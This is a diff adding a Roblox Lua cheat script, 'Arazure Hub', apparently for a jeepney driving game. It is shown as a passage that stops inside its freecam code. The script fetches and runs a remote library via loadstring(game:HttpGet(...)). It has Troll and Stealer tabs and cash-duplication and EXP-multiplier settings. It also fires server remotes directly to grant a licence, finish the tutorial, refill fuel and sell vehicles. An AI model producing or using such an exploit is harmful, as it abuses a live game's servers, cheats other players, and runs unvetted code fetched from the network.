@@ -1,0 +1,2272 @@
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local existingHub = CoreGui:FindFirstChild("TeddyUI_Premium") or 
+                    LocalPlayer.PlayerGui:FindFirstChild("TeddyUI_Premium") or
+                    CoreGui:FindFirstChild("ArazureHub") or
+                    LocalPlayer.PlayerGui:FindFirstChild("ArazureHub")
+
+if existingHub then
+    LocalPlayer:Kick("Hub is already running! Execute only once.")
+    return
+end
+
+local hubMarker = Instance.new("Folder")
+hubMarker.Name = "ArazureHub"
+hubMarker.Parent = CoreGui
+
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+local function applyHungerLabelsUI()
+    local success, result = pcall(function()
+        local targetParent = player:WaitForChild("PlayerGui"):WaitForChild("Screen"):WaitForChild("Labels"):WaitForChild("HungerLabels")
+        
+        for _, child in pairs(targetParent:GetChildren()) do
+            child:Destroy()
+        end
+        
+        if targetParent:IsA("Frame") or targetParent:IsA("GuiObject") then
+            targetParent.BackgroundTransparency = 1
+            targetParent.BorderSizePixel = 0
+        end
+        
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Name = "ARAZURE HUB"
+        MainFrame.Parent = targetParent
+        MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MainFrame.BackgroundTransparency = 0.4
+        MainFrame.Size = UDim2.new(0, 240, 0, 50)
+        MainFrame.Position = UDim2.new(0, 0, 0, -15)
+        MainFrame.BorderSizePixel = 0
+        
+        local UICorner = Instance.new("UICorner")
+        UICorner.CornerRadius = UDim.new(0, 10)
+        UICorner.Parent = MainFrame
+        
+        local UIStroke = Instance.new("UIStroke")
+        UIStroke.Parent = MainFrame
+        UIStroke.Thickness = 2
+        UIStroke.Transparency = 0
+        UIStroke.Color = Color3.fromRGB(255, 255, 255)
+        
+        local UIGradient = Instance.new("UIGradient")
+        UIGradient.Parent = UIStroke
+        UIGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(0.3, Color3.fromRGB(230, 230, 255)),
+            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200, 200, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+        })
+        
+        local rotation = 0
+        local connection
+        connection = RunService.RenderStepped:Connect(function(dt)
+            if not MainFrame.Parent then
+                connection:Disconnect()
+                return
+            end
+            rotation = rotation + (120 * dt)
+            UIGradient.Rotation = rotation
+        end)
+        
+        local Icon = Instance.new("ImageLabel")
+        Icon.Parent = MainFrame
+        Icon.BackgroundTransparency = 1
+        Icon.Size = UDim2.new(0, 35, 0, 35)
+        Icon.Position = UDim2.new(0, 8, 0.5, 0)
+        Icon.AnchorPoint = Vector2.new(0, 0.5)
+        Icon.Image = "rbxassetid://134914352741178"
+        
+        local Title = Instance.new("TextLabel")
+        Title.Parent = MainFrame
+        Title.BackgroundTransparency = 1
+        Title.Position = UDim2.new(0, 50, 0, 5)
+        Title.Size = UDim2.new(1, -55, 0, 20)
+        Title.Font = Enum.Font.GothamBlack
+        Title.Text = "ARAZURE HUB"
+        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Title.TextSize = 16
+        Title.TextXAlignment = Enum.TextXAlignment.Left
+        
+        local SubTitle = Instance.new("TextLabel")
+        SubTitle.Parent = MainFrame
+        SubTitle.BackgroundTransparency = 1
+        SubTitle.Position = UDim2.new(0, 50, 0, 22)
+        SubTitle.Size = UDim2.new(1, -55, 0, 20)
+        SubTitle.Font = Enum.Font.GothamBold
+        SubTitle.Text = "FREE SCRIPT"
+        SubTitle.TextColor3 = Color3.fromRGB(230, 230, 255)
+        SubTitle.TextSize = 12
+        SubTitle.TextXAlignment = Enum.TextXAlignment.Left
+    end)
+end
+
+task.spawn(applyHungerLabelsUI)
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mega-Azxue/Library/refs/heads/main/Ui%20Library%20Teddy"))()
+
+local Window = Library:NewWindow({
+    Title = "Arazure Hub",
+    Description = "Diesel n Steel",
+    Icon = "rbxassetid://134914352741178",
+    Color = Color3.fromRGB(255, 255, 255),
+    Size = UDim2.new(0, 500, 0, 350)
+})
+
+local MainTab = Window:T("Main", "rbxassetid://7733960981")
+local ShopTab = Window:T("Shop", "rbxassetid://7734056747")
+local MiscTab = Window:T("Misc", "rbxassetid://10709751939")
+local RoleTab = Window:T("Roles", "rbxassetid://7734042234")
+local MusicTab = Window:T("Music", "rbxassetid://10723427081")
+local BoostTab = Window:T("Boost", "rbxassetid://7733708835")
+local TpTab = Window:T("TP", "rbxassetid://7733992789")
+local TrollTab = Window:T("Troll", "rbxassetid://10723346158")
+local StealerTab = Window:T("Stealer", "rbxassetid://7733673800")
+local SettingsTab = Window:T("Settings", "rbxassetid://10734950309")
+
+local baryaViewer = Instance.new("ScreenGui")
+baryaViewer.Name = "BaryaViewer"
+baryaViewer.Parent = game:GetService("CoreGui")
+baryaViewer.Enabled = false
+
+local baryaFrame = Instance.new("Frame")
+baryaFrame.Size = UDim2.new(0, 200, 0, 50)
+baryaFrame.Position = UDim2.new(0.5, -100, 0.8, 0)
+baryaFrame.BackgroundTransparency = 1
+baryaFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+baryaFrame.BorderSizePixel = 0
+baryaFrame.Parent = baryaViewer
+
+local baryaText = Instance.new("TextLabel")
+baryaText.Size = UDim2.new(1, 0, 1, 0)
+baryaText.BackgroundTransparency = 1
+baryaText.TextColor3 = Color3.fromRGB(255, 255, 255)
+baryaText.TextStrokeTransparency = 0.5
+baryaText.TextSize = 20
+baryaText.Font = Enum.Font.GothamBold
+baryaText.Text = "Target Barya: 0"
+baryaText.Parent = baryaFrame
+
+local SettingsSection1 = SettingsTab:AddSection("Dupe Cash Settings")
+local dupeMultiplier = 1300
+local dupeMultiplierOptions = {"x30", "x100", "x500", "x1000", "x1300"}
+
+SettingsSection1:AddDropdown({
+    Title = "Dupe Cash Multiplier",
+    Description = "Select multiplier for dupe cash",
+    Values = dupeMultiplierOptions,
+    Default = "x1300",
+    Callback = function(value)
+        local num = value:match("%d+")
+        if num then
+            dupeMultiplier = tonumber(num)
+        end
+    end
+})
+
+local SettingsSection2 = SettingsTab:AddSection("EXP Settings")
+local expMultiplier = 10
+local manualExpMultiplier = 10
+local expMultiplierOptions = {"x10", "x50", "x100", "x200", "x300", "x500", "x1000"}
+local manualExpOptions = {
+    "x1", "x2", "x3", "x4", "x5", "x6", "x7", "x8", "x10",
+    "x20", "x30", "x40", "x50", "x60", "x70", "x80", "x90", "x100",
+    "x200", "x300", "x400", "x500", "x600", "x700", "x800", "x900", "x1000",
+    "x1100", "x1200", "x1300", "x1400", "x1500", "x1600", "x1800", "x1900", "x2000"
+}
+
+SettingsSection2:AddDropdown({
+    Title = "Auto EXP Multiplier",
+    Description = "Select multiplier for auto EXP",
+    Values = expMultiplierOptions,
+    Default = "x10",
+    Callback = function(value)
+        local num = value:match("%d+")
+        if num then
+            expMultiplier = tonumber(num)
+        end
+    end
+})
+
+SettingsSection2:AddDropdown({
+    Title = "Manual Gain Multiplier",
+    Description = "Select multiplier for manual gain",
+    Values = manualExpOptions,
+    Default = "x10",
+    Callback = function(value)
+        local num = value:match("%d+")
+        if num then
+            manualExpMultiplier = tonumber(num)
+        end
+    end
+})
+
+local SettingsSection3 = SettingsTab:AddSection("Send Settings")
+local selectedCashValue = 10
+local selectedCoinValue = 0.5
+
+SettingsSection3:AddInput({
+    Title = "Send Cash Value",
+    Description = "Enter value for send cash",
+    PlaceHolder = "10",
+    Default = "10",
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            selectedCashValue = num
+        end
+    end
+})
+
+SettingsSection3:AddInput({
+    Title = "Send Coin Value",
+    Description = "Enter value for send coin",
+    PlaceHolder = "0.5",
+    Default = "0.5",
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            selectedCoinValue = num
+        end
+    end
+})
+
+local SettingsSection4 = SettingsTab:AddSection("Jeep Settings")
+local unitOptions = {
+    "Unit 1 (434)", "Unit 2 (959)", "Unit 3 (404)", "Unit 4 (700)",
+    "Unit 5 (669)", "Unit 6 (981)", "Unit 7 (222)", "Unit 8 (934)"
+}
+local jeepneyOptions = {
+    "Sarao Custombuilt Model 2", "DF Devera Long Model",
+    "Morales 10 Seater", "Milwaukee Motor Sport 11 Seater"
+}
+local routeOptions = {"Balagtas - Bulakan", "Guiguinto - Bulakan", "Malolos - Bulakan"}
+local selectedUnit = "Unit 5 (669)"
+local selectedJeepney = "Sarao Custombuilt Model 2_#1"
+local selectedRoute = "Balagtas - Bulakan"
+
+SettingsSection4:AddDropdown({
+    Title = "Select Unit (Rent)",
+    Description = "Choose which unit to rent",
+    Values = unitOptions,
+    Default = "Unit 5 (669)",
+    Callback = function(value)
+        selectedUnit = value
+    end
+})
+
+SettingsSection4:AddDropdown({
+    Title = "Select Jeepney (Spawn)",
+    Description = "Choose jeepney model to spawn",
+    Values = jeepneyOptions,
+    Default = "Sarao Custombuilt Model 2",
+    Callback = function(value)
+        if value == "Sarao Custombuilt Model 2" then
+            selectedJeepney = "Sarao Custombuilt Model 2_#1"
+        elseif value == "DF Devera Long Model" then
+            selectedJeepney = "DF Devera Long Model_#1"
+        elseif value == "Morales 10 Seater" then
+            selectedJeepney = "Morales 10 Seater_#1"
+        elseif value == "Milwaukee Motor Sport 11 Seater" then
+            selectedJeepney = "Milwaukee Motor Sport 11 Seater_#1"
+        end
+    end
+})
+
+SettingsSection4:AddDropdown({
+    Title = "Select Route",
+    Description = "Choose route for jeepney",
+    Values = routeOptions,
+    Default = "Balagtas - Bulakan",
+    Callback = function(value)
+        selectedRoute = value
+    end
+})
+
+local MiscSection1 = MiscTab:AddSection("CPC Application")
+MiscSection1:AddButton({
+    Title = "Apply Guiguinto - Bulakan",
+    Description = "Apply for CPC on Guiguinto route",
+    Callback = function()
+        local args = { [1] = { ["Route"] = "Guiguinto - Bulakan" } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ApplyForCPC", 9e9):FireServer(unpack(args))
+    end
+})
+
+MiscSection1:AddButton({
+    Title = "Apply Balagtas - Bulakan",
+    Description = "Apply for CPC on Balagtas route",
+    Callback = function()
+        local args = { [1] = { ["Route"] = "Balagtas - Bulakan" } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ApplyForCPC", 9e9):FireServer(unpack(args))
+    end
+})
+
+MiscSection1:AddButton({
+    Title = "Apply Malolos - Bulakan",
+    Description = "Apply for CPC on Malolos route",
+    Callback = function()
+        local args = { [1] = { ["Route"] = "Malolos - Bulakan" } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ApplyForCPC", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MiscSection2 = MiscTab:AddSection("Remover")
+MiscSection2:AddButton({
+    Title = "Remove Jeepnies Exist",
+    Description = "Remove all jeepnies except yours",
+    Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        local jeepnies = workspace:FindFirstChild("Jeepnies")
+        if jeepnies then
+            for _, v in pairs(jeepnies:GetChildren()) do
+                if v.Name ~= player.Name then
+                    v:Destroy()
+                end
+            end
+        end
+    end
+})
+
+MiscSection2:AddButton({
+    Title = "Remove Vehicles Exist",
+    Description = "Remove all AI vehicles",
+    Callback = function()
+        local aiVehicles = workspace:FindFirstChild("AiVehicles")
+        if aiVehicles then
+            for _, v in pairs(aiVehicles:GetChildren()) do
+                v:Destroy()
+            end
+        end
+    end
+})
+
+local MiscSection3 = MiscTab:AddSection("Mess")
+MiscSection3:AddButton({
+    Title = "Hide Notif",
+    Description = "Remove notifications from screen",
+    Callback = function()
+        local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+        local function removeNotifications()
+            local react = PlayerGui:FindFirstChild("ReactContainer")
+            if react then
+                local notifs = react:FindFirstChild("Notifications")
+                if notifs then
+                    notifs:Destroy()
+                end
+            end
+        end
+        PlayerGui.ChildAdded:Connect(function(child)
+            if child.Name == "ReactContainer" then
+                task.delay(0.1, removeNotifications)
+            end
+        end)
+        if PlayerGui:FindFirstChild("ReactContainer") then
+            local react = PlayerGui.ReactContainer
+            react.ChildAdded:Connect(function(child)
+                if child.Name == "Notifications" then
+                    task.delay(0.05, removeNotifications)
+                end
+            end)
+        end
+        while true do
+            removeNotifications()
+            task.wait(2)
+        end
+    end
+})
+
+MiscSection3:AddButton({
+    Title = "Get Licence",
+    Description = "Pass the exam and get licence",
+    Callback = function()
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        ReplicatedStorage:WaitForChild("Remotes", 9e9):WaitForChild("PassedTheExam", 9e9):FireServer({})
+    end
+})
+
+MiscSection3:AddButton({
+    Title = "Complete Tutorial",
+    Description = "Complete the tutorial",
+    Callback = function()
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        ReplicatedStorage:WaitForChild("Remotes", 9e9):WaitForChild("CompletedTutorial", 9e9):FireServer({})
+    end
+})
+
+MiscSection3:AddButton({
+    Title = "Register Jeep",
+    Description = "Register your jeepney",
+    Callback = function()
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        ReplicatedStorage:WaitForChild("Remotes", 9e9):WaitForChild("RegisterJeepney", 9e9):FireServer({})
+    end
+})
+
+MiscSection3:AddButton({
+    Title = "Max Fuel",
+    Description = "Set your jeep fuel to maximum",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Amount"] = 100;
+                ["JeepneyValues"] = workspace:WaitForChild("Jeepnies", 9e9):WaitForChild(game.Players.LocalPlayer.Name, 9e9):WaitForChild("JeepneyValues", 9e9);
+            };
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("RecieveFuel", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MiscSection4 = MiscTab:AddSection("Server")
+MiscSection4:AddButton({
+    Title = "Server Hop",
+    Description = "Hop to a different server",
+    Callback = function()
+        local placeId = game.PlaceId
+        local jobId = game.JobId
+        local x = {}
+        for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"))) do
+            if type(v) == "table" then
+                for _, v2 in pairs(v) do
+                    if type(v2) == "table" and v2.playing ~= nil and v2.id ~= jobId then
+                        table.insert(x, v2.id)
+                    end
+                end
+            end
+        end
+        if #x > 0 then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, x[math.random(1, #x)], game.Players.LocalPlayer)
+        end
+    end
+})
+
+MiscSection4:AddButton({
+    Title = "Rejoin",
+    Description = "Rejoin the current server",
+    Callback = function()
+        local placeId = game.PlaceId
+        local jobId = game.JobId
+        game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
+    end
+})
+
+local MiscSection5 = MiscTab:AddSection("Jeep Selling")
+
+local selectedSellJeep = "Sarao Custombuilt Model 2_#1"
+local sellJeepOptions = { "Sarao Custombuilt Model 2", "DF Devera Long Model", "Morales 10 Seater", "Milwaukee Motor Sport 11 Seater" }
+
+MiscSection5:AddDropdown({
+    Title = "Select Jeep to Sell",
+    Description = "Choose which jeep to sell",
+    Values = sellJeepOptions,
+    Default = "Sarao Custombuilt Model 2",
+    Callback = function(value)
+        if value == "Sarao Custombuilt Model 2" then
+            selectedSellJeep = "Sarao Custombuilt Model 2_#1"
+        elseif value == "DF Devera Long Model" then
+            selectedSellJeep = "DF Devera Long Model_#1"
+        elseif value == "Morales 10 Seater" then
+            selectedSellJeep = "Morales 10 Seater_#1"
+        elseif value == "Milwaukee Motor Sport 11 Seater" then
+            selectedSellJeep = "Milwaukee Motor Sport 11 Seater_#1"
+        end
+    end
+})
+
+MiscSection5:AddButton({
+    Title = "Sell Jeep",
+    Description = "Sell the selected jeep",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Index"] = selectedSellJeep
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("SellJeepney", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MiscSection6 = MiscTab:AddSection("Freecam")
+local freecamToggle = false
+local freecamGui = nil
+
+MiscSection6:AddToggle({
+    Title = "Freecam",
+    Description = "Allow Camera To Move Aside",
+    Default = false,
+    Callback = function(state)
+        freecamToggle = state
+        if state then
+            local success, result = pcall(function()
+                local Players = game:GetService("Players")
+                local RunService = game:GetService("RunService")
+                local UserInputService = game:GetService("UserInputService")
+                local player = Players.LocalPlayer
+                local camera = workspace.CurrentCamera
+                local playerGui = player:WaitForChild("PlayerGui")
+                local playerScripts = player:WaitForChild("PlayerScripts")
+                local playerModule = nil
+                local controlsModule = nil
+                
+                task.spawn(function()
+                    local ok, mod = pcall(function()
+                        return require(playerScripts:WaitForChild("PlayerModule"))
+                    end)
+                    if ok and mod then
+                        playerModule = mod
+                        controlsModule = mod:GetControls()
+                    end
+                end)
+                
+                local DEFAULT_SPEED = 50
+                local MIN_SPEED = 5
+                local MAX_SPEED = 1000
+                local SPEED_STEP = 10
+                local LOOK_SENSITIVITY = 0.25
+                local TAP_THRESHOLD = 10
+                
+                local freecamOn = false
+                local camSpeed = DEFAULT_SPEED
+                local yaw = 0
+                local pitch = 0
+                local camPos = Vector3.zero
+                local origCamType, origCamSubject
+                local origWalkSpeed, origJumpPower, origJumpHeight
+                local frozenPosition = nil
+                local lookTouch = nil
+                local lastLookPos = nil
+                local upHeld = false
+                local downHeld = false
+                local dragModeOn = false
+                
+                local function addCorner(parent, radius)
+                    local c = Instance.new("UICorner")
+                    c.CornerRadius = UDim.new(0, radius or 8)
+                    c.Parent = parent
+                end
+                
+                local function addStroke(parent, color, thickness)
+                    local s = Instance.new("UIStroke")
+                    s.Color = color or Color3.fromRGB(255, 255, 255)
+                    s.Thickness = thickness or 1.5
+                    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+                    s.Parent = parent
+                end
+                
+                local function makeButton(props)
+                    local b = Instance.new("TextButton")
+                    b.BorderSizePixel = 0
+                    b.Active = true
+                    for k, v in pairs(props) do b[k] = v end
+                    return b
+                end
+                
+                freecamGui = Instance.new("ScreenGui")
+                freecamGui.Name = "FreecamMobileGui"
+                freecamGui.ResetOnSpawn = false
+                freecamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                freecamGui.DisplayOrder = 10
+                freecamGui.Parent = playerGui
+                
+                local topBar = Instance.new("Frame")
+                topBar.Name = "TopBar"
+                topBar.Size = UDim2.new(0, 230, 0, 50)
+                topBar.Position = UDim2.new(0.5, -115, 0, 14)
+                topBar.AnchorPoint = Vector2.new(0, 0)
+                topBar.BackgroundTransparency = 1
+                topBar.Parent = freecamGui
+                topBar.ZIndex = 50
+                
+                local toggleBtn = makeButton({
+                    Name = "ToggleBtn",
+                    Size = UDim2.new(0, 150, 0, 50),
+                    Position = UDim2.new(0, 0, 0, 0),
+                    AnchorPoint = Vector2.new(0, 0),
+                    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+                    BackgroundTransparency = 0.15,
+                    Text = "Start Freecam",
+                    TextColor3 = Color3.new(1, 1, 1),
+                    TextSize = 16,
+                    Font = Enum.Font.GothamBold,
+                    AutoButtonColor = false,
+                    Parent = topBar,
+                    ZIndex = 50,
+                })
+                addCorner(toggleBtn, 12)
+                addStroke(toggleBtn, Color3.fromRGB(255, 255, 255), 1.5)
+                
+                local lockBtn = makeButton({
+                    Name = "LockBtn",
+                    Size = UDim2.new(0, 70, 0, 50),
+                    Position = UDim2.new(0, 160, 0, 0),
+                    AnchorPoint = Vector2.new(0, 0),
+                    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+                    BackgroundTransparency = 0.15,
+                    Text = "Lock",
+                    TextColor3 = Color3.fromRGB(180, 180, 180),
+                    TextSize = 18,
+                    Font = Enum.Font.GothamBold,
+                    AutoButtonColor = false,
+                    Visible = true,
+                    Parent = topBar,
+                    ZIndex = 50,
+                })
+                addCorner(lockBtn, 12)
+                addStroke(lockBtn, Color3.fromRGB(255, 255, 255), 1.5)
+                
+                local controls = Instance.new("Frame")
+                controls.Name = "Controls"
+                controls.Size = UDim2.new(1, 0, 1, 0)
+                controls.BackgroundTransparency = 1
+                controls.Visible = true
+                controls.Parent = freecamGui
+                
+                local function vertButton(name, label, yOffset)
+                    local b = makeButton({
+                        Name = name,
+                        Size = UDim2.new(0, 72, 0, 72),
+                        AnchorPoint = Vector2.new(0.5, 0.5),
+                        Position = UDim2.new(1, -80, 1, yOffset),
+                        BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+                        BackgroundTransparency = 0.25,
+                        Text = label,
+                        TextColor3 = Color3.new(1, 1, 1),
+                        TextSize = 28,
+                        Font = Enum.Font.GothamBold,
+                        Parent = controls,
+                    })
+                    addCorner(b, 14)
+                    addStroke(b, Color3.fromRGB(255, 255, 255))
+                    return b
+                end
+                
+                local upBtn = vertButton("UpBtn", "▲", -260)
+                local downBtn = vertButton("DownBtn", "▼", -170)
+                
+                local speedPanel = Instance.new("Frame")
+                speedPanel.Name = "SpeedPanel"
+                speedPanel.Size = UDim2.new(0, 220, 0, 52)
+                speedPanel.AnchorPoint = Vector2.new(0.5, 1)
+                speedPanel.Position = UDim2.new(0.5, 0, 1, -16)
+                speedPanel.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+                speedPanel.BackgroundTransparency = 0.2
+                speedPanel.Active = true
+                speedPanel.Parent = controls
+                addCorner(speedPanel, 14)
+                addStroke(speedPanel, Color3.fromRGB(255, 255, 255))
+                
+                local speedDown = makeButton({
+                    Name = "SpeedDown",
+                    Size = UDim2.new(0, 52, 1, 0),
+                    Position = UDim2.new(0, 0, 0, 0),
+                    BackgroundTransparency = 1,
+                    Text = "-",
+                    TextColor3 = Color3.fromRGB(255, 110, 110),
+                    TextSize = 30,
+                    Font = Enum.Font.GothamBold,
+                    Parent = speedPanel,
+                })
+                
+                local speedLabel = Instance.new("TextLabel")
+                speedLabel.Name = "SpeedLabel"
+                speedLabel.Size = UDim2.new(1, -104, 1, 0)
+                speedLabel.Position = UDim2.new(0, 52, 0, 0)
+                speedLabel.BackgroundTransparency = 1
+                speedLabel.Text = "Speed: " .. camSpeed
+                speedLabel.TextColor3 = Color3.new(1, 1, 1)
+                speedLabel.TextSize = 15
+                speedLabel.Font = Enum.Font.GothamBold
+                speedLabel.Parent = speedPanel
+                
+                local speedUp = makeButton({
+                    Name = "SpeedUp",
+                    Size = UDim2.new(0, 52, 1, 0),
+                    Position = UDim2.new(1, -52, 0, 0),
+                    BackgroundTransparency = 1,
+                    Text = "+",
+                    TextColor3 = Color3.fromRGB(110, 255, 110),
+                    TextSize = 30,
+                    Font = Enum.Font.GothamBold,
+                    Parent = speedPanel,
+                })
+                
+                local function updateLockVisuals()
+                    if dragModeOn then
+                        lockBtn.Text = "Unlock"
+                        lockBtn.BackgroundColor3 = Color3.fromRGB(30, 100, 50)
+                        lockBtn.TextColor3 = Color3.fromRGB(110, 255, 130)
+                        for _, child in ipairs(lockBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                            end
+                        end
+                        for _, child in ipairs(upBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                                child.Thickness = 2.5
+                            end
+                        end
+                        for _, child in ipairs(downBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                                child.Thickness = 2.5
+                            end
+                        end
+                    else
+                        lockBtn.Text = "Lock"
+                        lockBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+                        lockBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+                        for _, child in ipairs(lockBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                            end
+                        end
+                        for _, child in ipairs(upBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                                child.Thickness = 1.5
+                            end
+                        end
+                        for _, child in ipairs(downBtn:GetChildren()) do
+                            if child:IsA("UIStroke") then
+                                child.Color = Color3.fromRGB(255, 255, 255)
+                                child.Thickness = 1.5
+                            end
+                        end
+                    end
+                end
+                
+                do
+                    local state = {
+                        touch = nil, startPos = nil, startAnchor = nil,
+                        totalDist = 0, dragging = false,
+                    }
+                    topBar.InputBegan:Connect(function(input)
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local pos = Vector2.new(input.Position.X, input.Position.Y)
+                        local function onRect(p, obj)
+                            local ap = obj.AbsolutePosition
+                            local as = obj.AbsoluteSize
+                            return p.X >= ap.X and p.X <= ap.X + as.X
+                                and p.Y >= ap.Y and p.Y <= ap.Y + as.Y
+                        end
+                        if onRect(pos, toggleBtn) or (lockBtn.Visible and onRect(pos, lockBtn)) then
+                            return
+                        end
+                        state.touch = input
+                        state.startPos = pos
+                        state.startAnchor = topBar.Position
+                        state.totalDist = 0
+                        state.dragging = false
+                    end)
+                    topBar.InputChanged:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local current = Vector2.new(input.Position.X, input.Position.Y)
+                        state.totalDist = (current - state.startPos).Magnitude
+                        if state.totalDist > TAP_THRESHOLD then
+                            state.dragging = true
+                            local deltaX = input.Position.X - state.startPos.X
+                            local deltaY = input.Position.Y - state.startPos.Y
+                            topBar.Position = UDim2.new(
+                                state.startAnchor.X.Scale,
+                                state.startAnchor.X.Offset + deltaX,
+                                state.startAnchor.Y.Scale,
+                                state.startAnchor.Y.Offset + deltaY
+                            )
+                        end
+                    end)
+                    topBar.InputEnded:Connect(function(input)
+                        if input ~= state.touch then return end
+                        state.touch = nil
+                        state.dragging = false
+                    end)
+                end
+                
+                do
+                    local state = {
+                        touch = nil, startPos = nil, startAnchor = nil,
+                        totalDist = 0, dragging = false,
+                    }
+                    toggleBtn.InputBegan:Connect(function(input)
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        state.touch = input
+                        state.startPos = Vector2.new(input.Position.X, input.Position.Y)
+                        state.startAnchor = topBar.Position
+                        state.totalDist = 0
+                        state.dragging = false
+                    end)
+                    toggleBtn.InputChanged:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local current = Vector2.new(input.Position.X, input.Position.Y)
+                        state.totalDist = (current - state.startPos).Magnitude
+                        if state.totalDist > TAP_THRESHOLD then
+                            state.dragging = true
+                            local deltaX = input.Position.X - state.startPos.X
+                            local deltaY = input.Position.Y - state.startPos.Y
+                            topBar.Position = UDim2.new(
+                                state.startAnchor.X.Scale,
+                                state.startAnchor.X.Offset + deltaX,
+                                state.startAnchor.Y.Scale,
+                                state.startAnchor.Y.Offset + deltaY
+                            )
+                        end
+                    end)
+                    toggleBtn.InputEnded:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        if state.totalDist <= TAP_THRESHOLD then
+                            if freecamOn then
+                                freecamOn = false
+                                camera.CameraType = origCamType or Enum.CameraType.Custom
+                                camera.CameraSubject = origCamSubject
+                                    or (player.Character and player.Character:FindFirstChildWhichIsA("Humanoid"))
+                                if player.Character then
+                                    local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
+                                    local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                                    if rootPart then
+                                        rootPart.Anchored = false
+                                        rootPart.AssemblyLinearVelocity = Vector3.zero
+                                        rootPart.AssemblyAngularVelocity = Vector3.zero
+                                    end
+                                    if humanoid then
+                                        humanoid.WalkSpeed = origWalkSpeed or 16
+                                        humanoid.JumpPower = origJumpPower or 50
+                                        humanoid.JumpHeight = origJumpHeight or 7.2
+                                        humanoid:Move(Vector3.zero, false)
+                                    end
+                                end
+                                frozenPosition = nil
+                                toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+                                toggleBtn.Text = "Start Freecam"
+                                lookTouch = nil
+                                lastLookPos = nil
+                                upHeld = false
+                                downHeld = false
+                                dragModeOn = false
+                                updateLockVisuals()
+                                task.spawn(function()
+                                    local touchGui = playerGui:FindFirstChild("TouchGui")
+                                    if touchGui then touchGui.Enabled = true end
+                                end)
+                            else
+                                freecamOn = true
+                                origCamType = camera.CameraType
+                                origCamSubject = camera.CameraSubject
+                                camera.CameraType = Enum.CameraType.Scriptable
+                                if player.Character then
+                                    local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
+                                    local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoid then
+                                        origWalkSpeed = humanoid.WalkSpeed
+                                        origJumpPower = humanoid.JumpPower
+                                        origJumpHeight = humanoid.JumpHeight
+                                        humanoid.WalkSpeed = 0
+                                        humanoid.JumpPower = 0
+                                        humanoid.JumpHeight = 0
+                                        humanoid:Move(Vector3.zero, false)
+                                    end
+                                    if rootPart then
+                                        frozenPosition = rootPart.CFrame
+                                        rootPart.AssemblyLinearVelocity = Vector3.zero
+                                        rootPart.AssemblyAngularVelocity = Vector3.zero
+                                        rootPart.Anchored = true
+                                        rootPart.CFrame = frozenPosition
+                                    end
+                                end
+                                if controlsModule then
+                                    pcall(function() controlsModule:Disable() end)
+                                    task.defer(function()
+                                        if controlsModule then
+                                            pcall(function() controlsModule:Enable() end)
+                                        end
+                                    end)
+                                end
